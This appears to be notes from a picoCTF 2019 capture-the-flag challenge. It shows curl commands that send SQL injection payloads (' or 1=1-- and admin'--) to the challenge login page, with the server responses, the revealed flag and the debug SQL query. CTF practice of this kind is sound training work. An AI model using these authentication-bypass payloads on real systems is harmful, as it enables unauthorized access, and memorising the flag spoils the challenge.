#https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Irish-Name-Repo_2.md

'''
curl "https://jupiter.challenges.picoctf.org/problem/64649/login.php" --data "username=admin&password='+or+1=1--" && echo
<h1>SQLi detected.</h1>


curl "https://jupiter.challenges.picoctf.org/problem/64649/login.php" --data "username=admin'--&password=1" && echo
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_015815e2}</p>

curl "https://jupiter.challenges.picoctf.org/problem/64649/login.php" --data "username=admin'--&password=1&debug=1" && echo
<pre>username: admin'--
password: 1
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_015815e2}</p>

'''
